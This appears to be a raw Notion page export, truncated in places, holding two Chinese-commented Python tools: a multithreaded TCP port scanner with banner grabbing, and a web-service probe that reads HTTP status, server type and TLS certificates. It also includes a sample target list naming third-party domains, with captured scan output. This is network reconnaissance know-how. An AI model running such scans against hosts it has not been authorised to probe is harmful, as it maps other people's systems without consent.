HtAQ25eHGA,\"start\",\"end\"":{"s":{"x":"zgtWkX_06rnUHtAQ25eHGA","i":[{"t":"s"},{"t":"t","i":["3fWAIDQlfV1R",1],"o":"start","l":15,"c":"输出开放端口列表及其服务类型。"},{"t":"e"}],"l":""},"c":[]}}}}},"role":"reader"},"14d99968-1bdb-804e-9b6d-ebfa481439a3":{"value":{"id":"14d99968-1bdb-804e-9b6d-ebfa481439a3","version":12,"type":"code","properties":{"title":[["import socket\nimport os\nimport json\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom tqdm import tqdm\nfrom ipaddress import ip_address\n\n\ndef validate_host(host):\n    \"\"\"\n    验证主机名是否有效。\n    :param host: 用户输入的主机名或IP\n    :return: 如果主机名有效，返回True，否则返回False\n    \"\"\"\n    try:\n        socket.gethostbyname(host)  # 尝试解析主机名\n        return True\n    except socket.gaierror:\n        return False\n\n\ndef is_private_ip(ip):\n    \"\"\"\n    检查IP是否为内网地址。\n    :param ip: IP地址\n    :return: 如果是内网IP，返回True，否则返回False\n    \"\"\"\n    ip = ip_address(ip)\n    return ip.is_private\n\n\ndef parse_port_range(port_range):\n    \"\"\"\n    解析用户输入的端口范围。\n    :param port_range: 例如 '1-1000'\n    :return: 端口范围的生成器\n    :raises ValueError: 当格式错误或范围无效时抛出异常\n    \"\"\"\n    try:\n        start_port, end_port = map(int, port_range.split(\"-\"))\n        if start_port \u003c 1 or end_port \u003e 65535 or start_port \u003e end_port:\n            raise ValueError\n        return range(start_port, end_port + 1)\n    except ValueError:\n        raise ValueError(\"端口范围格式错误，必须是 '1-65535' 的形式，且范围有效。\")\n\n\ndef scan_port(host, port):\n    \"\"\"\n    扫描单个端口是否开放，并尝试获取服务信息。\n    :param host: 目标主机\n    :param port: 目标端口号\n    :return: 如果开放，返回 (端口号, 服务名称, Banner 信息)，否则返回 None\n    \"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(2)  # 设置超时时间\n            result = s.connect_ex((host, port))  # 检查端口是否开放\n            if result == 0:  # 端口开放\n                try:\n                    service = socket.getservbyport(port)  # 获取服务名称\n                except OSError:\n                    service = \"Unknown\"  # 如果无法获取服务名称，则返回 Unknown\n                \n                # 尝试获取服务的 Banner 信息\n                banner = grab_banner(host, port)\n                return port, service, banner\n    except Exception as e:\n        pass  # 忽略其他异常\n    return None\n\n\ndef grab_banner(host, port):\n    \"\"\"\n    抓取开放端口的服务Banner。\n    :param host: 目标主机\n    :param port: 目标端口号\n    :return: 返回抓取到的服务Banner信息\n    \"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(2)\n            s.connect((host, port))\n            s.sendall(b\"\\r\\n\")  # 发送空数据包\n            banner = s.recv(1024).decode().strip()  # 接收返回的Banner信息\n            return banner if banner else \"Unknown\"\n    except Exception:\n        return \"Unknown\"\n\n\ndef scan_ports(host, ports, max_threads=100):\n    \"\"\"\n    并发扫描指定主机的端口。\n    :param host: 目标主机\n    :param ports: 需要扫描的端口范围\n    :param max_threads: 最大线程数\n    :return: 开放端口及服务信息的列表\n    \"\"\"\n    open_ports = []\n    with ThreadPoolExecutor(max_threads) as executor:\n        futures = {executor.submit(scan_port, host, port): port for port in ports}\n        for future in tqdm(as_completed(futures), total=len(ports), desc=f\"扫描 {host}\"):\n            try:\n                result = future.result()\n                if result:\n                    open_ports.append(result)\n                    # 实时显示扫描结果\n                    port, service, banner = result\n                    print(f\"[实时发现] 主机 {host} 端口 {port} 开放: 服务 {service} | Banner: {banner}\")\n            except Exception as e:\n                print(f\"扫描时发生错误: {e}\")\n    return open_ports\n\n\ndef save_results(results, filename=\"scan_results.json\"):\n    \"\"\"\n    将扫描结果保存为JSON文件。\n    :param results: 扫描结果\n    :param filename: 文件名\n    \"\"\"\n    try:\n        with open(filename, \"w\") as f:\n            json.dump(results, f, indent=4, ensure_ascii=False)\n        print(f\"扫描结果已保存到 {filename}\")\n    except Exception as e:\n        print(f\"保存结果时发生错误: {e}\")\n\n\ndef is_admin():\n    \"\"\"\n    检查当前用户是否为管理员。\n    :return: 如果是管理员返回True，否则返回False\n    \"\"\"\n    try:\n        return os.getuid() == 0  # Linux 检查是否为 root\n    except AttributeError:\n        import ctypes\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows 检查管理员权限\n\n\ndef scan_from_file(file_path):\n    \"\"\"\n    从文件读取目标主机和端口范围，批量扫描。\n    :param file_path: 文件路径\n    \"\"\"\n    try:\n        with open(file_path, \"r\") as f:\n            targets = json.load(f)\n    except Exception as e:\n        print(f\"读取文件时发生错误：{e}\")\n        return\n\n    if not isinstance(targets, list):\n        print(\"文件格式错误：需要包含目标主机和端口范围的列表。\")\n        return\n\n    all_results = []\n    for target in targets:\n        host = target.get(\"host\")\n        port_range = target.get(\"ports\")\n        if not host or not port_range:\n            print(f\"跳过无效目标：{target}\")\n            continue\n\n        if not validate_host(host):\n            print(f\"错误：无法解析主机名 {host}，跳过...\")\n            continue\n\n        try:\n            ports = parse_port_range(port_range)\n        except ValueError as ve:\n            print(f\"错误：目标 {host} 的端口范围无效 - {ve}，跳过...\")\n            continue\n\n        print(f\"\\n开始扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\\n\")\n        results = scan_ports(host, ports)\n        if results:\n            all_results.append({\"host\": host, \"open_ports\": results})\n\n    save_results(all_results, \"batch_scan_results.json\")\n\n\ndef main():\n    \"\"\"\n    主函数：用户交互入口，调用扫描功能。\n    \"\"\"\n    print(\"=== 高级端口扫描器 🚪🔑 ===\")\n    mode = input(\"请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: \").strip()\n\n    if mode == \"1\":\n        host = input(\"请输入目标主机（IP 或域名）： \").strip()\n\n        # 验证主机名是否有效\n        if not validate_host(host):\n            print(\"错误：无法解析主机名，请检查输入的目标主机地址！\")\n            return\n\n        # 检查是否扫描公网IP\n        if not is_private_ip(socket.gethostbyname(host)):\n            confirm = input(\"目标为公网IP，确定继续扫描？(y/n): \").strip().lower()\n            if confirm != \"y\":\n                print(\"已取消扫描公网IP。\")\n                return\n\n        port_range = input(\"请输入端口范围（例如 1-1000）： \").strip()\n\n        # 解析端口范围\n        try:\n            ports = parse_port_range(port_range)\n        except ValueError as ve:\n            print(f\"错误：{ve}\")\n            return\n\n        # 提示用户是否具有管理员权限\n        if not is_admin():\n            print(\"提示：扫描低号端口（1-1024）可能需要管理员权限，当前用户可能无法扫描这些端口。\")\n\n        print(f\"\\n正在扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\\n\")\n\n        try:\n            # 调用扫描功能\n            open_ports = scan_ports(host, ports)\n            if open_ports:\n                print(\"\\n扫描完成！以下端口开放：\\n\")\n                for port, service, banner in open_ports:\n                    print(f\"端口 {port}: {service} | Banner: {banner}\")\n                \n                # 保存结果\n                save_results({\"host\": host, \"open_ports\": open_ports})\n            else:\n                print(\"扫描完成！未发现开放端口。\")\n        except Exception as e:\n            print(f\"扫描时发生错误：{e}\")\n\n    elif mode == \"2\":\n        file_path = input(\"请输入包含目标的文件路径（JSON 格式）： \").strip()\n        scan_from_file(file_path)\n\n    else:\n        print(\"无效选项，退出。\")\n\n\nif __name__ == \"__main__\":\n    main()"]],"language":[["Python"]]},"created_time":1732843858499,"last_edited_time":1732843877304,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"PLdpxWdfLi16GozKl-zIbw,\"start\",\"end\"","n":{"PLdpxWdfLi16GozKl-zIbw,\"start\",\"end\"":{"s":{"x":"PLdpxWdfLi16GozKl-zIbw","i":[{"t":"s"},{"t":"t","i":["qVwkPD9tGDI-",1],"o":"start","l":6595,"c":"import socket\nimport os\nimport json\nfrom concurrent.futures import ThreadPoolExecutor, as_completed\nfrom tqdm import tqdm\nfrom ipaddress import ip_address\n\n\ndef validate_host(host):\n    \"\"\"\n    验证主机名是否有效。\n    :param host: 用户输入的主机名或IP\n    :return: 如果主机名有效，返回True，否则返回False\n    \"\"\"\n    try:\n        socket.gethostbyname(host)  # 尝试解析主机名\n        return True\n    except socket.gaierror:\n        return False\n\n\ndef is_private_ip(ip):\n    \"\"\"\n    检查IP是否为内网地址。\n    :param ip: IP地址\n    :return: 如果是内网IP，返回True，否则返回False\n    \"\"\"\n    ip = ip_address(ip)\n    return ip.is_private\n\n\ndef parse_port_range(port_range):\n    \"\"\"\n    解析用户输入的端口范围。\n    :param port_range: 例如 '1-1000'\n    :return: 端口范围的生成器\n    :raises ValueError: 当格式错误或范围无效时抛出异常\n    \"\"\"\n    try:\n        start_port, end_port = map(int, port_range.split(\"-\"))\n        if start_port \u003c 1 or end_port \u003e 65535 or start_port \u003e end_port:\n            raise ValueError\n        return range(start_port, end_port + 1)\n    except ValueError:\n        raise ValueError(\"端口范围格式错误，必须是 '1-65535' 的形式，且范围有效。\")\n\n\ndef scan_port(host, port):\n    \"\"\"\n    扫描单个端口是否开放，并尝试获取服务信息。\n    :param host: 目标主机\n    :param port: 目标端口号\n    :return: 如果开放，返回 (端口号, 服务名称, Banner 信息)，否则返回 None\n    \"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(2)  # 设置超时时间\n            result = s.connect_ex((host, port))  # 检查端口是否开放\n            if result == 0:  # 端口开放\n                try:\n                    service = socket.getservbyport(port)  # 获取服务名称\n                except OSError:\n                    service = \"Unknown\"  # 如果无法获取服务名称，则返回 Unknown\n                \n                # 尝试获取服务的 Banner 信息\n                banner = grab_banner(host, port)\n                return port, service, banner\n    except Exception as e:\n        pass  # 忽略其他异常\n    return None\n\n\ndef grab_banner(host, port):\n    \"\"\"\n    抓取开放端口的服务Banner。\n    :param host: 目标主机\n    :param port: 目标端口号\n    :return: 返回抓取到的服务Banner信息\n    \"\"\"\n    try:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.settimeout(2)\n            s.connect((host, port))\n            s.sendall(b\"\\r\\n\")  # 发送空数据包\n            banner = s.recv(1024).decode().strip()  # 接收返回的Banner信息\n            return banner if banner else \"Unknown\"\n    except Exception:\n        return \"Unknown\"\n\n\ndef scan_ports(host, ports, max_threads=100):\n    \"\"\"\n    并发扫描指定主机的端口。\n    :param host: 目标主机\n    :param ports: 需要扫描的端口范围\n    :param max_threads: 最大线程数\n    :return: 开放端口及服务信息的列表\n    \"\"\"\n    open_ports = []\n    with ThreadPoolExecutor(max_threads) as executor:\n        futures = {executor.submit(scan_port, host, port): port for port in ports}\n        for future in tqdm(as_completed(futures), total=len(ports), desc=f\"扫描 {host}\"):\n            try:\n                result = future.result()\n                if result:\n                    open_ports.append(result)\n                    # 实时显示扫描结果\n                    port, service, banner = result\n                    print(f\"[实时发现] 主机 {host} 端口 {port} 开放: 服务 {service} | Banner: {banner}\")\n            except Exception as e:\n                print(f\"扫描时发生错误: {e}\")\n    return open_ports\n\n\ndef save_results(results, filename=\"scan_results.json\"):\n    \"\"\"\n    将扫描结果保存为JSON文件。\n    :param results: 扫描结果\n    :param filename: 文件名\n    \"\"\"\n    try:\n        with open(filename, \"w\") as f:\n            json.dump(results, f, indent=4, ensure_ascii=False)\n        print(f\"扫描结果已保存到 {filename}\")\n    except Exception as e:\n        print(f\"保存结果时发生错误: {e}\")\n\n\ndef is_admin():\n    \"\"\"\n    检查当前用户是否为管理员。\n    :return: 如果是管理员返回True，否则返回False\n    \"\"\"\n    try:\n        return os.getuid() == 0  # Linux 检查是否为 root\n    except AttributeError:\n        import ctypes\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0  # Windows 检查管理员权限\n\n\ndef scan_from_file(file_path):\n    \"\"\"\n    从文件读取目标主机和端口范围，批量扫描。\n    :param file_path: 文件路径\n    \"\"\"\n    try:\n        with open(file_path, \"r\") as f:\n            targets = json.load(f)\n    except Exception as e:\n        print(f\"读取文件时发生错误：{e}\")\n        return\n\n    if not isinstance(targets, list):\n        print(\"文件格式错误：需要包含目标主机和端口范围的列表。\")\n        return\n\n    all_results = []\n    for target in targets:\n        host = target.get(\"host\")\n        port_range = target.get(\"ports\")\n        if not host or not port_range:\n            print(f\"跳过无效目标：{target}\")\n            continue\n\n        if not validate_host(host):\n            print(f\"错误：无法解析主机名 {host}，跳过...\")\n            continue\n\n        try:\n            ports = parse_port_range(port_range)\n        except ValueError as ve:\n            print(f\"错误：目标 {host} 的端口范围无效 - {ve}，跳过...\")\n            continue\n\n        print(f\"\\n开始扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\\n\")\n        results = scan_ports(host, ports)\n        if results:\n            all_results.append({\"host\": host, \"open_ports\": results})\n\n    save_results(all_results, \"batch_scan_results.json\")\n\n\ndef main():\n    \"\"\"\n    主函数：用户交互入口，调用扫描功能。\n    \"\"\"\n    print(\"=== 高级端口扫描器 🚪🔑 ===\")\n    mode = input(\"请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: \").strip()\n\n    if mode == \"1\":\n        host = input(\"请输入目标主机（IP 或域名）： \").strip()\n\n        # 验证主机名是否有效\n        if not validate_host(host):\n            print(\"错误：无法解析主机名，请检查输入的目标主机地址！\")\n            return\n\n        # 检查是否扫描公网IP\n        if not is_private_ip(socket.gethostbyname(host)):\n            confirm = input(\"目标为公网IP，确定继续扫描？(y/n): \").strip().lower()\n            if confirm != \"y\":\n                print(\"已取消扫描公网IP。\")\n                return\n\n        port_range = input(\"请输入端口范围（例如 1-1000）： \").strip()\n\n        # 解析端口范围\n        try:\n            ports = parse_port_range(port_range)\n        except ValueError as ve:\n            print(f\"错误：{ve}\")\n            return\n\n        # 提示用户是否具有管理员权限\n        if not is_admin():\n            print(\"提示：扫描低号端口（1-1024）可能需要管理员权限，当前用户可能无法扫描这些端口。\")\n\n        print(f\"\\n正在扫描主机 {host} 的端口 {ports.start}-{ports.stop - 1}...\\n\")\n\n        try:\n            # 调用扫描功能\n            open_ports = scan_ports(host, ports)\n            if open_ports:\n                print(\"\\n扫描完成！以下端口开放：\\n\")\n                for port, service, banner in open_ports:\n                    print(f\"端口 {port}: {service} | Banner: {banner}\")\n                \n                # 保存结果\n                save_results({\"host\": host, \"open_ports\": open_ports})\n            else:\n                print(\"扫描完成！未发现开放端口。\")\n        except Exception as e:\n            print(f\"扫描时发生错误：{e}\")\n\n    elif mode == \"2\":\n        file_path = input(\"请输入包含目标的文件路径（JSON 格式）： \").strip()\n        scan_from_file(file_path)\n\n    else:\n        print(\"无效选项，退出。\")\n\n\nif __name__ == \"__main__\":\n    main()"},{"t":"e"}],"l":""},"c":[]}}}}},"role":"reader"},"14d99968-1bdb-805f-bb81-dde6d8daf3d5":{"value":{"id":"14d99968-1bdb-805f-bb81-dde6d8daf3d5","version":296,"type":"code","properties":{"title":[["#示例扫描文件\n[\n    {\n        \"host\": \"baidu.com\",\n        \"ports\": \"80-443\"\n    },\n    {\n        \"host\": \"hackerchi.top\",\n        \"ports\": \"1-1000\"\n    }\n]\n\n#实时返回数据\n=== 高级端口扫描器 🚪🔑 ===\n请选择模式：1. 单主机扫描  2. 批量扫描（从文件）: 2\n请输入包含目标的文件路径（JSON 格式）： scan_list.txt\n\n开始扫描主机 baidu.com 的端口 80-443...\n\n扫描 baidu.com:   0%|▏                                                   | 1/364 [00:01\u003c11:20,  1.87s/it][实时发现] 主机 baidu.com 端口 80 开放: 服务 http | Banner: Unknown\n扫描 baidu.com:  83%|█████████████████████████████████████████▎        | 301/364 [00:07\u003c00:01, 43.56it/s][实时发现] 主机 baidu.com 端口 443 开放: 服务 https | Banner: Unknown\n扫描 baidu.com: 100%|██████████████████████████████████████████████████| 364/364 [00:08\u003c00:00, 45.29it/s] \n\n开始扫描主机 hackerchi.top 的端口 1-1000...\n\n扫描 hackerchi.top:   0%|                                                       | 0/1000 [00:00\u003c?, ?it/s][实时发现] 主机 hackerchi.top 端口 80 开放: 服务 http | Ba 07":{"value":{"id":"14d99968-1bdb-80ac-9008-e2d7ab673707","version":12,"type":"code","properties":{"title":[["import requests\nfrom urllib.parse import urlparse\nimport json\nimport ssl\nimport socket\n\n\ndef validate_url(url):\n    \"\"\"\n    验证 URL 是否有效。\n    :param url: 用户输入的 URL\n    :return: 如果 URL 格式有效，返回 True，否则返回 False\n    \"\"\"\n    try:\n        result = urlparse(url)\n        return all([result.scheme, result.netloc])  # URL 必须包含协议和主机名\n    except Exception:\n        return False\n\n\ndef send_http_request(url, method=\"GET\", headers=None, allow_redirects=True, timeout=10):\n    \"\"\"\n    发送 HTTP 请求，获取响应状态码和头信息。\n    :param url: 目标 URL\n    :param method: HTTP 方法（默认 GET）\n    :param headers: 自定义请求头\n    :param allow_redirects: 是否允许重定向\n    :param timeout: 超时时间\n    :return: 响应状态码、头信息和正文内容\n    \"\"\"\n    if headers is None:\n        # 默认请求头，模拟真实浏览器\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\",\n            \"Accept-Language\": \"en-US,en;q=0.9\",\n            \"Accept\": \"*/*\",\n        }\n\n    try:\n        response = requests.request(\n            method, url, headers=headers, allow_redirects=allow_redirects, timeout=timeout\n        )\n        return response.status_code, response.headers, response.text\n    except requests.exceptions.MissingSchema:\n        raise ValueError(\"URL 缺少协议，请以 http:// 或 https:// 开头！\")\n    except requests.exceptions.ConnectionError:\n        raise ValueError(\"无法连接到目标 URL，请检查地址是否正确！\")\n    except requests.exceptions.Timeout:\n        raise ValueError(\"请求超时，目标 URL 响应过慢！\")\n    except Exception as e:\n        raise ValueError(f\"发送请求时发生未知错误：{e}\")\n\n\ndef fetch_ssl_certificate_info(url):\n    \"\"\"\n    获取 HTTPS 网站的 SSL/TLS 证书信息。\n    :param url: 目标 URL\n    :return: 证书信息字典\n    \"\"\"\n    try:\n        parsed_url = urlparse(url)\n        hostname = parsed_url.netloc.split(\":\")[0]\n        port = 443  # HTTPS 默认端口\n\n        context = ssl.create_default_context()\n        with socket.create_connection((hostname, port)) as sock:\n            with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                cert = ssock.getpeercert()\n\n        # 提取证书信息\n        return {\n            \"Issuer\": dict(x[0] for x in cert.get(\"issuer\", [])),\n            \"Subject\": dict(x[0] for x in cert.get(\"subject\", [])),\n            \"Valid From\": cert.get(\"notBefore\"),\n            \"Valid Until\": cert.get(\"notAfter\"),\n            \"Serial Number\": cert.get(\"serialNumber\"),\n            \"Version\": cert.get(\"version\"),\n        }\n    except Exception as e:\n        return {\"Error\": f\"无法获取 SSL 证书信息：{e}\"}\n\n\ndef analyze_content(content):\n    \"\"\"\n    分析响应内容，判断页面类型或特征。\n    :param content: 响应正文内容\n    :return: 页面内容的类型信息\n    \"\"\"\n    content = content.lower()\n    if \"\u003chtml\" in content:\n        if \"login\" in content or \"sign in\" in content:\n            return \"Login Page - 页面包含登录表单。\"\n        elif \"error\" in content or \"not found\" in content:\n            return \"Error Page - 页面可能是错误页。\"\n        elif \"\u003cdiv\" in content or \"\u003cspan\" in content:\n            return \"HTML Page - 一般的 HTML 页面。\"\n    elif \"json\" in content or \"{\" in content:\n        return \"API Response - 页面返回 JSON 数据，可能是 API 响应。\"\n    elif \"\u003csvg\" in content or \"\u003ccircle\" in content:\n        return \"SVG File - 页面返回 SVG 图像。\"\n    return \"Unknown Content - 无法识别的页面内容。\"\n\n\ndef interpret_status_code(status_code):\n    \"\"\"\n    对 HTTP 状态码进行解释。\n    :param status_code: HTTP 状态码\n    :return: 状态码的解释信息\n    \"\"\"\n    explanations = {\n        200: \"OK - 请求成功，服务器返回了请求的资源。\",\n        201: \"Created - 请求成功并创建了新的资源。\",\n        204: \"No Content - 请求成功，但服务器未返回内容。\",\n        301: \"Moved Permanently - 资源永久重定向到新的 URL。\",\n        302: \"Found - 资源临时重定向到新的 URL。\",\n        304: \"Not Modified - 缓存的资源未改变，返回未修改的副本。\",\n        400: \"Bad Request - 请求格式错误，服务器无法理解。\",\n        401: \"Unauthorized - 未授权，需要身份验证。\",\n        403: \"Forbidden - 服务器拒绝执行请求。\",\n        404: \"Not Found - 请求的资源不存在。\",\n        405: \"Method Not Allowed - 请求方法被禁止。\",\n        408: \"Request Timeout - 请求超时，服务器未收到完整请求。\",\n        500: \"Internal Server Error - 服务器发生未知错误。\",\n        502: \"Bad Gateway - 网关或代理服务器收到无效响应。\",\n        503: \"Service Unavailable - 服务器暂时不可用（过载或维护中）。\",\n        504: \"Gateway Timeout - 网关或代理超时。\",\n    }\n    return explanations.get(status_code, \"Unknown Status Code - 未知状态码。\")\n\n\ndef interpret_server_type(server):\n    \"\"\"\n    对服务器类型进行解释。\n    :param server: 服务器类型（响应头中的 Server 字段）\n    :return: 服务器类型的解释信息\n    \"\"\"\n    server_types = {\n        \"nginx\": \"Nginx - 一种高性能的开源 HTTP 和反向代理服务器，常用于负载均衡。\",\n        \"apache\": \"Apache - 世界上最流行的开源 Web 服务器，功能强大且灵活。\",\n        \"iis\": \"IIS - 微软开发的 Internet 信息服务，常用于运行 ASP.NET 应用程序。\",\n        \"cloudflare\": \"Cloudflare - 一种 CDN 和网络安全服务，通常用于增强网站性能和安全性。\",\n        \"gws\": \"Google Web Server - 谷歌使用的专属 Web 服务器，提供高性能服务。\",\n        \"litespeed\": \"LiteSpeed - 一种轻量级高性能 Web 服务器，专为速度优化。\",\n        \"openresty\": \"OpenResty - 基于 Nginx 的高性能 Web 平台，可扩展用于动态 Web 应用。\",\n        \"caddy\": \"Caddy - 一种自动化 HTTPS、高性能的 Web 服务器，适合开发者。\",\n        \"gunicorn\": \"Gunicorn - 一个基于 Python 的 WSGI HTTP 服务器，用于运行 Python Web 应用。\",\n    }\n    for key, explanation in server_types.items():\n        if key in server.lower():\n            return explanation\n    return \"Unknown - 无法确定的服务器类型。\"\n\n\ndef single_probe(url):\n    \"\"\"\n    针对单个 URL 的探测，并实时输出重点内容。\n    :param url: 单个目标 URL\n    :return: 探测结果字典\n    \"\"\"\n    try:\n        print(f\"\\n正在探测：{url}\")\n        status_code, headers, content = send_http_request(url)\n\n        # 提取信息\n        status_explanation = interpret_status_code(status_code)\n        server = headers.get(\"Server\", \"Unknown\")\n        server_explanation = interpret_server_type(server)\n        content_analysis = analyze_content(content)\n\n        # 获取 SSL 信息（如果是 HTTPS）\n        ssl_info = fetch_ssl_certificate_info(url) if url.startswith(\"https://\") else {}\n\n        # 实时输出重点内容\n        print(f\"状态码：{status_code} - {status_explanation}\")\n        print(f\"服务器类型：{server} - {server_explanation}\")\n        print(f\"页面内容分析：{content_analysis}\")\n        if ssl_info:\n            print(\"SSL/TLS 证书信息：\")\n            for key, value in ssl_info.items():\n                print(f\"  {key}: {value}\")\n\n        # 返回结果\n        return {\n            \"URL\": url,\n            \"Status Code\": status_code,\n            \"Status Explanation\": status_explanation,\n            \"Server\": server,\n            \"Server Explanation\": server_explanation,\n            \"Content Analysis\": content_analysis,\n            \"SSL Info\": ssl_info,\n        }\n    except ValueError as ve:\n        print(f\"错误：{ve}\")\n        return {\"URL\": url, \"Error\": str(ve)}\n    except Exception as e:\n        print(f\"未知错误：{e}\")\n        return {\"URL\": url, \"Error\": str(e)}\n\n\ndef batch_probe(urls):\n    \"\"\"\n    批量探测多个 URL，并实时输出重点内容。\n    :param urls: URL 列表\n    :return: 每个 URL 的探测结果（列表）\n    \"\"\"\n    results = []\n    for url in urls:\n        result = single_probe(url)\n        results.append(result)\n    return results\n\n\ndef save_results(results, filename=\"web_probe_results.json\"):\n    \"\"\"\n    将探测结果保存为 JSON 文件。\n    :param results: 探测结果\n    :param filename: 文件名\n    \"\"\"\n    try:\n        with open(filename, \"w\") as f:\n            json.dump(results, f, indent=4, ensure_ascii=False)\n        print(f\"探测结果已保存到文件：{filename}\")\n    except Exception as e:\n        print(f\"保存结果时发生错误：{e}\")\n\n\ndef load_urls_from_file(filename):\n    \"\"\"\n    从文件中加载 URL 列表。\n    :param filename: 文件名\n    :return: URL 列表\n    \"\"\"\n    try:\n        with open(filename, \"r\") as f:\n            urls = [line.strip() for line in f if line.strip()]\n        if not urls:\n            raise ValueError(\"文件中没有有效的 URL！\")\n        return urls\n    except FileNotFoundError:\n        print(f\"错误：文件 {filename} 不存在！\")\n        return []\n    except Exception as e:\n        print(f\"加载文件时发生错误：{e}\")\n        return []\n\n\ndef main():\n    \"\"\"\n    主函数：用户交互入口，支持单个 URL 探测和批量 URL 探测。\n    \"\"\"\n    print(\"=== Web 服务探测工具 🌐🛠 ===\")\n    mode = input(\"请选择模式（1: 单个 URL 探测，2: 批量 URL 探测）： \").strip()\n\n    if mode == \"1\":\n        # 单个 URL 探测\n        url = input(\"请输入目标 URL（例如 https://example.com）： \").strip()\n        if not validate_url(url):\n            print(\"错误：输入的 URL 无效，请输入有效的 URL！\")\n            return\n        single_probe(url)\n    elif mode == \"2\":\n        # 批量 URL 探测\n        filename = input(\"请输入包含 URL 列表的文件名： \").strip()\n        urls = load_urls_from_file(filename)\n        if not urls:\n            return\n\n        print(f\"\\n共加载 {len(urls)} 个 URL，正在探测中...\\n\")\n        results = batch_probe(urls)\n        save_results(results)\n    else:\n        print(\"错误：无效的模式选择！\")\n\n\nif __name__ == \"__main__\":\n    main()"]],"language":[["Python"]]},"created_time":1732842852360,"last_edited_time":1732842861118,"parent_id":"14a99968-1bdb-80ba-b3cb-eab23bfe6b1a","parent_table":"block","alive":true,"space_id":"dcfc0b10-f3f6-4bfe-a7f8-895b46badeca","crdt_format_version":1,"crdt_data":{"title":{"r":"L-xUw5dtL9cAvVQguAyTvA,\"start\",\"end\"","n":{"L-xUw5dtL9cAvVQguAyTvA,\"start\",\"end\"":{"s":{"x":"L-xUw5dtL9cAvVQguAyTvA","i":[{"t":"s"},{"t":"t","i":["K_ZTJbXkvnUv",1],"o":"start","l":8382,"c":"import requests\nfrom urllib.parse import urlparse\nimport json\nimport ssl\nimport socket\n\n\ndef validate_url(url):\n    \"\"\"\n    验证 URL 是否有效。\n    :param url: 用户输入的 URL\n    :return: 如果 URL 格式有效，返回 True，否则返回 False\n    \"\"\"\n    try:\n        result = urlparse(url)\n        return all([result.scheme, result.netloc])  # URL 必须包含协议和主机名\n    except Exception:\n        return False\n\n\ndef send_http_request(url, method=\"GET\", headers=None, allow_redirects=True, timeout=10):\n    \"\"\"\n    发送 HTTP 请求，获取响应状态码和头信息。\n    :param url: 目标 URL\n    :param method: HTTP 方法（默认 GET）\n    :param headers: 自定义请求头\n    :param allow_redirects: 是否允许重定向\n    :param timeout: 超时时间\n    :return: 响应状态码、头信息和正文内容\n    \"\"\"\n    if headers is None:\n        # 默认请求头，模拟真实浏览器\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\",\n            \"Accept-Language\": \"en-US,en;q=0.9\",\n            \"Accept\": \"*/*\",\n        }\n\n    try:\n        response = requests.request(\n            method, url, headers=headers, allow_redirects=allow_redirects, timeout=timeout\n        )\n        return response.status_code, response.headers, response.text\n    except requests.exceptions.MissingSchema:\n        raise ValueError(\"URL 缺少协议，请以 http:// 或 https:// 开头！\")\n    except requests.exceptions.ConnectionError:\n        raise ValueError(\"无法连接到目标 URL，请检查地址是否正确！\")\n    except requests.exceptions.Timeout:\n        raise ValueError(\"请求超时，目标 URL 响应过慢！\")\n    except Exception as e:\n        raise ValueError(f\"发送请求时发生未知错误：{e}\")\n\n\ndef fetch_ssl_certificate_info(url):\n    \"\"\"\n    获取 HTTPS 网站的 SSL/TLS 证书信息。\n    :param url: 目标 URL\n    :return: 证书信息字典\n    \"\"\"\n    try:\n        parsed_url = urlparse(url)\n        hostname = parsed_url.netloc.split(\":\")[0]\n        port = 443  # HTTPS 默认端口\n\n        context = ssl.create_default_context()\n        with socket.create_connection((hostname, port)) as sock:\n            with context.wrap_socket(sock, server_hostname=hostname) as ssock:\n                cert = ssock.getpeercert()\n\n        # 提取证书信息\n        return {\n            \"Issuer\": dict(x[0] for x in cert.get(\"issuer\", [])),\n            \"Subject\": dict(x[0] for x in cert.get(\"subject\", [])),\n            \"Valid From\": cert.get(\"notBefore\"),\n            \"Valid Until\": cert.get(\"notAfter\"),\n            \"Serial Number\": cert.get(\"serialNumber\"),\n            \"Version\": cert.get(\"version\"),\n        }\n    except Exception as e:\n        return {\"Error\": f\"无法获取 SSL 证书信息：{e}\"}\n\n\ndef analyze_content(content):\n    \"\"\"\n    分析响应内容，判断页面类型或特征。\n    :param content: 响应正文内容\n    :return: 页面内容的类型信息\n    \"\"\"\n    content = content.lower()\n    if \"\u003chtml\" in content:\n        if \"login\" in content or \"sign in\" in content:\n            return \"Login Page - 页面包含登录表单。\"\n        elif \"error\" in content or \"not found\" in content:\n            return \"Error Page - 页面可能是错误页。\"\n        elif \"\u003cdiv\" in content or \"\u003cspan\" in content:\n            return \"HTML Page - 一般的 HTML 页面。\"\n    elif \"json\" in content or \"{\" in content:\n        return \"API Response - 页面返回 JSON 数据，可能是 API 响应。\"\n    elif \"\u003csvg\" in content or \"\u003ccircle\" in content:\n        return \"SVG File - 页面返回 SVG 图像。\"\n    return \"Unknown Content - 无法识别的页面内容。\"\n\n\ndef interpret_status_code(status_code):\n    \"\"\"\n    对 HTTP 状态码进行解释。\n    :param status_code: HTTP 状态码\n    :return: 状态码的解释信息\n    \"\"\"\n    explanations = {\n        200: \"OK - 请求成功，服务器返回了请求的资源。\",\n        201: \"Created - 请求成功并创建了新的资源。\",\n        204: 